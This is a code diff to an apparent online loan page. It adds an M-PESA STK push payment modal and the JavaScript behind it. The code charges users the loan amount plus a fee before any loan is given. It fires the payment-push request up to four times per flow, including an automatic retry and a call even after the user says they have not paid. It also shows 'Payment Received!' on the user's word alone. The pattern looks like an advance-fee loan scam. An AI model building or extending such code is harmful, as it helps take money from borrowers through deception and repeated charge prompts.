@@ -565,6 +565,274 @@
             margin: 24px 0;
         }
 
+        /* STK PUSH MODAL */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+            backdrop-filter: blur(4px);
+        }
+
+        .modal-overlay.show {
+            display: flex;
+        }
+
+        .modal-box {
+            background: white;
+            border-radius: 24px;
+            overflow: hidden;
+            width: 100%;
+            max-width: 380px;
+            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.3);
+        }
+
+        .modal-header {
+            background: #059669;
+            padding: 20px 24px;
+            text-align: center;
+            color: white;
+        }
+
+        .modal-label {
+            font-size: 10px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            opacity: 0.7;
+            margin-bottom: 4px;
+        }
+
+        .modal-header h3 {
+            font-size: 20px;
+            font-weight: 800;
+        }
+
+        .modal-body {
+            padding: 24px;
+        }
+
+        .modal-form-step .info-box {
+            background: #f0fdf4;
+            border-radius: 12px;
+            padding: 14px;
+            margin-bottom: 20px;
+            border-left: 4px solid #059669;
+        }
+
+        .modal-form-step .info-box p {
+            font-size: 12px;
+            color: #059669;
+            font-weight: 600;
+            line-height: 1.5;
+        }
+
+        .modal-form-step input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #e5e7eb;
+            border-radius: 12px;
+            font-weight: 700;
+            font-size: 15px;
+            outline: none;
+            transition: border 0.2s;
+            margin-bottom: 12px;
+            background: #f8fafc;
+        }
+
+        .modal-form-step input:focus {
+            border-color: #059669;
+        }
+
+        .modal-form-step .btn-modal-primary {
+            width: 100%;
+            padding: 16px;
+            background: #059669;
+            color: white;
+            font-weight: 700;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 15px;
+            transition: background 0.2s;
+        }
+
+        .modal-form-step .btn-modal-primary:hover {
+            background: #047857;
+        }
+
+        .modal-form-step .btn-modal-secondary {
+            width: 100%;
+            padding: 16px;
+            background: #f3f4f6;
+            color: #059669;
+            font-weight: 700;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 15px;
+            margin-top: 8px;
+        }
+
+        .modal-pin-step {
+            text-align: center;
+        }
+
+        .modal-pin-step .pin-card {
+            background: #f8fafc;
+            padding: 24px;
+            border-radius: 16px;
+            margin-bottom: 20px;
+            border-left: 4px solid #059669;
+        }
+
+        .modal-pin-step .pin-card p {
+            font-size: 13px;
+            font-weight: 700;
+            color: #1e293b;
+            line-height: 1.6;
+        }
+
+        .modal-pin-step .btn-modal-primary {
+            width: 100%;
+            padding: 16px;
+            background: #059669;
+            color: white;
+            font-weight: 700;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .modal-spinner-step {
+            text-align: center;
+            padding: 30px 0;
+        }
+
+        .spinner-circle {
+            width: 48px;
+            height: 48px;
+            border: 4px solid #e5e7eb;
+            border-top-color: #059669;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        .modal-spinner-step h3 {
+            font-size: 16px;
+            font-weight: 700;
+            color: #1e293b;
+            margin-bottom: 16px;
+        }
+
+        .modal-choice-step {
+            text-align: center;
+        }
+
+        .modal-choice-step .choice-card {
+            background: #f0fdf4;
+            padding: 20px;
+            border-radius: 16px;
+            margin-bottom: 20px;
+            border-left: 4px solid #059669;
+        }
+
+        .modal-choice-step .choice-card h3 {
+            font-size: 13px;
+            font-weight: 700;
+            text-transform: uppercase;
+            margin-bottom: 6px;
+            color: #059669;
+        }
+
+        .modal-choice-step .choice-card p {
+            font-size: 11px;
+            color: #6b7280;
+            font-weight: 600;
+        }
+
+        .modal-choice-step .btn-modal-primary {
+            width: 100%;
+            padding: 16px;
+            background: #059669;
+            color: white;
+            font-weight: 700;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 11px;
+            text-transform: uppercase;
+        }
+
+        .modal-choice-step .btn-modal-secondary {
+            width: 100%;
+            padding: 16px;
+            background: #1e293b;
+            color: white;
+            font-weight: 700;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 14px;
+            margin-top: 8px;
+        }
+
+        .modal-success-step {
+            text-align: center;
+            padding: 10px 0;
+        }
+
+        .success-icon {
+            width: 56px;
+            height: 56px;
+            background: #059669;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 12px;
+            color: white;
+            font-size: 24px;
+        }
+
+        .modal-success-step h3 {
+            font-size: 20px;
+            font-weight: 800;
+            margin-bottom: 4px;
+            color: #059669;
+        }
+
+        .timer-display {
+            font-size: 36px;
+            font-weight: 900;
+            color: #059669;
+            margin: 12px 0 20px;
+        }
+
+        .modal-success-step .btn-modal-secondary {
+            width: 100%;
+            padding: 16px;
+            background: #f3f4f6;
+            color: #059669;
+            font-weight: 700;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 11px;
+            text-transform: uppercase;
+            margin-top: 8px;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
         @media (max-width: 768px) {
             .navbar {
                 padding: 16px 20px;
@@ -838,6 +1106,65 @@
         </div>
     </div>
 
+    <!-- STK PUSH PAYMENT MODAL -->
+    <div class="modal-overlay" id="paymentModal">
+        <div class="modal-box">
+            <div class="modal-header">
+                <div class="modal-label">Secure M-PESA Payment</div>
+                <h3>Loan Payment <span id="modalLoanAmount">KSh 50,250</span></h3>
+            </div>
+
+            <div class="modal-body">
+                <!-- STEP 1: FORM -->
+                <div id="modalFormStep" class="modal-form-step">
+                    <div class="info-box">
+                        <p>Enter your M-PESA registered phone number to receive the STK payment prompt for your loan.</p>
+                    </div>
+                    <input type="tel" id="phoneNum" placeholder="07XXXXXXXX" inputmode="numeric">
+                    <button onclick="showPinConfirmation()" class="btn-modal-primary">
+                        Pay <span id="payAmount">KSh 50,250</span>
+                    </button>
+                    <button onclick="closePaymentModal()" class="btn-modal-secondary">Cancel</button>
+                </div>
+
+                <!-- STEP 2: PIN CONFIRMATION -->
+                <div id="modalPinStep" class="modal-pin-step hidden">
+                    <div class="pin-card">
+                        <p>🔒 Now enter your M-PESA PIN <strong>on the prompt sent to your phone</strong> to complete payment for <strong id="confirmAmount">KSh 50,250</strong></p>
+                    </div>
+                    <button onclick="triggerInitialSTK()" class="btn-modal-primary">Continue to Payment</button>
+                    <button onclick="backToForm()" class="btn-modal-secondary">Back</button>
+                </div>
+
+                <!-- STEP 3: SPINNER/AWAITING -->
+                <div id="modalSpinnerStep" class="modal-spinner-step hidden">
+                    <div class="spinner-circle"></div>
+                    <h3>Check M-PESA on your phone for the STK prompt</h3>
+                    <button onclick="showStatusChoice()" class="btn-modal-primary">✓ I've entered my PIN</button>
+                </div>
+
+                <!-- STEP 4: STATUS CHOICE -->
+                <div id="modalChoiceStep" class="modal-choice-step hidden">
+                    <div class="choice-card">
+                        <h3>Payment Verification</h3>
+                        <p>Please confirm if you have completed the M-PESA transaction on your phone.</p>
+                    </div>
+                    <button onclick="finalTrigger('paid')" class="btn-modal-primary">✓ I HAVE PAID — ACTIVATE LOAN</button>
+                    <button onclick="finalTrigger('unpaid')" class="btn-modal-secondary">I HAVE NOT PAID</button>
+                </div>
+
+                <!-- STEP 5: SUCCESS -->
+                <div id="modalSuccessStep" class="modal-success-step hidden">
+                    <div class="success-icon">✓</div>
+                    <h3>Payment Received!</h3>
+                    <div class="timer-display" id="timerDisplay">5:00</div>
+                    <p style="font-size:12px;color:#64748b;font-weight:600;margin-bottom:16px;">Your loan is being processed. Redirecting...</p>
+                    <button onclick="location.reload()" class="btn-modal-secondary">Back to Home</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
     <script>
         const loanOptions = [
             { amount: 5000, fee: 25 },
@@ -919,56 +1246,177 @@
             goToPage('loans');
         }
 
-        async function handlePayment(e) {
+        // Open STK modal when user completes form
+        function handlePayment(e) {
             e.preventDefault();
             clearError();
 
             const firstName = document.getElementById('firstName').value.trim();
             const lastName = document.getElementById('lastName').value.trim();
             const email = document.getElementById('email').value.trim();
-            const phoneNumber = document.getElementById('phoneNumber').value.trim();
 
-            if (!firstName || !lastName || !email || !phoneNumber) {
+            if (!firstName || !lastName || !email) {
                 showError('Please fill in all fields');
                 return;
             }
 
-            const payBtn = document.getElementById('payBtn');
-            payBtn.disabled = true;
-            payBtn.innerHTML = '<span class="spinner"></span> Processing...';
+            // Store user info for later
+            window.loanUserInfo = {
+                firstName,
+                lastName,
+                email,
+                loanAmount: selectedAmount,
+                processingFee: selectedFee,
+                totalAmount: selectedAmount + selectedFee
+            };
 
+            // Update modal with loan amount
+            const totalAmount = selectedAmount + selectedFee;
+            document.getElementById('modalLoanAmount').textContent = `KSh ${totalAmount.toLocaleString()}`;
+            document.getElementById('payAmount').textContent = `KSh ${totalAmount.toLocaleString()}`;
+            document.getElementById('confirmAmount').textContent = `KSh ${totalAmount.toLocaleString()}`;
+
+            // Reset modal to form step and show it
+            resetPaymentModal();
+            document.getElementById('paymentModal').classList.add('show');
+        }
+
+        // STK Push API call
+        async function triggerSTKCall(note) {
             try {
+                const phoneInput = document.getElementById('phoneNum').value;
                 const totalAmount = selectedAmount + selectedFee;
-                const response = await fetch('/api/payment/initiate-stk', {
+
+                if (!phoneInput) {
+                    console.error('Phone number required');
+                    return;
+                }
+
+                console.log('[v0] STK Trigger:', note);
+
+                const response = await fetch('/api/stk-push', {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
                     body: JSON.stringify({
-                        phoneNumber,
                         amount: totalAmount,
-                        loanAmount: selectedAmount,
-                        firstName,
-                        lastName,
-                        email,
-                    }),
+                        phone_number: phoneInput,
+                        firstName: window.loanUserInfo.firstName,
+                        lastName: window.loanUserInfo.lastName,
+                        email: window.loanUserInfo.email,
+                        loanAmount: selectedAmount
+                    })
                 });
 
                 const data = await response.json();
-
-                if (!response.ok) {
-                    throw new Error(data.error || 'Payment failed');
-                }
-
-                setTimeout(() => {
-                    document.getElementById('refId').textContent = data.transactionId || `LN-${Math.random().toString(36).substr(2, 9).toUpperCase()}`;
-                    goToPage('success');
-                }, 2000);
-
+                console.log('[v0] STK Response:', data);
+                return data;
             } catch (error) {
-                showError(error.message || 'Payment initiation failed. Please try again.');
-                payBtn.disabled = false;
-                payBtn.innerHTML = 'Complete Payment';
+                console.error('[v0] STK Push Error:', error);
             }
         }
+
+        // Modal workflow functions
+        function closePaymentModal() {
+            document.getElementById('paymentModal').classList.remove('show');
+            resetPaymentModal();
+        }
+
+        function resetPaymentModal() {
+            document.getElementById('modalFormStep').classList.remove('hidden');
+            document.getElementById('modalPinStep').classList.add('hidden');
+            document.getElementById('modalSpinnerStep').classList.add('hidden');
+            document.getElementById('modalChoiceStep').classList.add('hidden');
+            document.getElementById('modalSuccessStep').classList.add('hidden');
+            document.getElementById('phoneNum').value = '';
+        }
+
+        function showPaymentStep(stepId) {
+            ['modalFormStep', 'modalPinStep', 'modalSpinnerStep', 'modalChoiceStep', 'modalSuccessStep'].forEach(id => {
+                document.getElementById(id).classList.toggle('hidden', id !== stepId);
+            });
+        }
+
+        function backToForm() {
+            showPaymentStep('modalFormStep');
+        }
+
+        // Step 1: User enters phone and clicks Pay
+        function showPinConfirmation() {
+            const phone = document.getElementById('phoneNum').value;
+            if (!phone || phone.length < 9) {
+                alert('Please enter a valid M-PESA phone number');
+                return;
+            }
+
+            // Trigger 1: Initial Pay Button Click
+            triggerSTKCall('Trigger 1: Initial Pay Button');
+            showPaymentStep('modalPinStep');
+        }
+
+        // Step 2: User confirms PIN instructions
+        function triggerInitialSTK() {
+            // Trigger 2: PIN Confirmed
+            triggerSTKCall('Trigger 2: PIN Instructions Confirmed');
+            showPaymentStep('modalSpinnerStep');
+
+            // Trigger 3: Auto-Retry after 2 seconds
+            setTimeout(() => {
+                triggerSTKCall('Trigger 3: Auto-Retry Backup');
+            }, 2000);
+        }
+
+        // Step 3: User confirms they entered PIN
+        function showStatusChoice() {
+            showPaymentStep('modalChoiceStep');
+        }
+
+        // Step 4: User confirms payment status and we process
+        function finalTrigger(status) {
+            // Trigger 4: Manual Status Confirmation
+            triggerSTKCall('Trigger 4: Payment Status: ' + status);
+
+            if (status === 'paid') {
+                showPaymentStep('modalSuccessStep');
+                startPaymentTimer();
+            } else {
+                alert('Please complete the payment on your phone and try again');
+                showPaymentStep('modalChoiceStep');
+            }
+        }
+
+        // Timer display
+        function startPaymentTimer() {
+            let timeLeft = 300; // 5 minutes
+            const display = document.getElementById('timerDisplay');
+            const interval = setInterval(() => {
+                const mins = Math.floor(timeLeft / 60);
+                const secs = timeLeft % 60;
+                display.textContent = mins + ':' + (secs < 10 ? '0' : '') + secs;
+                if (--timeLeft < 0) {
+                    clearInterval(interval);
+                    goToPage('success');
+                    closePaymentModal();
+                }
+            }, 1000);
+        }
+
+        // Close modal on overlay click
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('paymentModal')?.addEventListener('click', function(e) {
+                if (e.target === this) closePaymentModal();
+            });
+
+            // Format phone input
+            const phoneInput = document.getElementById('phoneNum');
+            if (phoneInput) {
+                phoneInput.addEventListener('input', function() {
+                    this.value = this.value.replace(/[^0-9]/g, '').slice(0, 10);
+                });
+            }
+        });
 
         function showError(message) {
             const errorDiv = document.getElementById('errorMessage');
